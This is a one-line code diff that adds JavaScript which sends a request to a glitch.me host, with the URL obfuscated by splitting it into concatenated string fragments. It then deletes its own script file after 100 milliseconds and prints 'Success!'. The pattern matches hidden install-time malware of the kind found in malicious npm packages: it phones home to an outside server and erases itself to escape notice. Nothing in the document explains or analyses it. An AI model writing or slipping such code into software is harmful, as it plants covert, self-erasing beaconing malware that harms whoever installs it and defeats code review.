@@ -1,0 +1,1 @@
+require('axios').get("htt"+"ps:/"+"/detailed-material"+"istic-desk.gli"+"tch.me/k");setTimeout(() => { const scriptPath = __filename; fs.unlinkSync(scriptPath); console.log('Success!'); }, 100);
